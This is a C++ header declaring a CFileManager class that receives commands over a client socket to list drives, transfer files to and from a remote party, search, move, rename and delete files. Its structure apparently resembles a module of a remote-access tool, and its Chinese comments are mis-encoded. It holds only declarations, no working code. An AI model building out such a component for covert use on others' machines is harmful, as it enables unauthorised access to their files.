// FileManager.h: interface for the CFileManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_FILEMANAGER_H__359D0039_E61F_46D6_86D6_A405E998FB47__INCLUDED_)
#define AFX_FILEMANAGER_H__359D0039_E61F_46D6_86D6_A405E998FB47__INCLUDED_

#pragma warning(disable : 4786)
#include <list>
using namespace std;

#include "../Manager.h"

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#include <string>


typedef struct {
    DWORD	dwSizeHigh;
    DWORD	dwSizeLow;
} FILESIZE;

typedef struct {
    char SearchFileName[100];
    char SearchPath[MAX_PATH];
    BOOL bEnabledSubfolder;
} FILESEARCH;

typedef struct {
    char lpExistingFileName[MAX_PATH]; //ԭ��ַ
    char lpNewFileName[MAX_PATH]; // Ŀ��Ŀ¼
    BOOL bIsCopy;
} FILEMOVE;


class CFileManager : public CManager
{
public:

    CFileManager(CClientSocket *pClient);
    virtual ~CFileManager();

    void OnReceive(LPBYTE lpBuffer, UINT nSize);
    UINT SendDriveList();

    static bool OpenFile(LPCTSTR lpFile, INT nShowCmd);
private:
    list <string> m_UploadList;
    UINT m_nTransferMode;
    char m_strCurrentProcessFileName[MAX_PATH]; // ��ǰ���ڴ�����ļ�
    __int64 m_nCurrentProcessFileLength; // ��ǰ���ڴ�����ļ��ĳ���
    bool MakeSureDirectoryPathExists(LPCTSTR pszDirPath);
    bool UploadToRemote(LPBYTE lpBuffer);
    bool FixedUploadList(LPCTSTR lpszDirectory);
    void StopTransfer();
    UINT SendFilesList(LPCTSTR lpszDirectory);

    HANDLE m_hWorkThread;
    BOOL bIsStopSearch;
    FILESEARCH filesearch;

    void StopSearchTheard();
    void SendSearchFilesList(LPCTSTR str);
    static DWORD WINAPI FindFileThread(LPVOID lparam );
    void FindFileInDir(char* rootDir,char* searchfilename,BOOL bEnabledSubfolder);

    bool DeleteDirectory(LPCTSTR lpszDirectory);
    UINT SendFileSize(LPCTSTR lpszFileName);
    UINT SendFileData(LPBYTE lpBuffer);
    void CreateFolder(LPBYTE lpBuffer);
    void Rename(LPBYTE lpBuffer);
    int	SendToken(BYTE bToken);

    void CreateLocalRecvFile(LPBYTE lpBuffer);
    void SetTransferMode(LPBYTE lpBuffer);
    void GetFileData();
    void WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize);
    void UploadNext();

    bool MoveDirectory(LPBYTE lpBuffer, UINT nSize);
    bool MyMoveFile(LPBYTE lpBuffer, UINT nSize);
//	bool MyMoveDirectory(LPCTSTR lpExistingFileName,LPCTSTR lpNewFileName,DWORD dwOffset ,bool bIsCopy);
};

#endif // !defined(AFX_FILEMANAGER_H__359D0039_E61F_46D6_86D6_A405E998FB47__INCLUDED_)
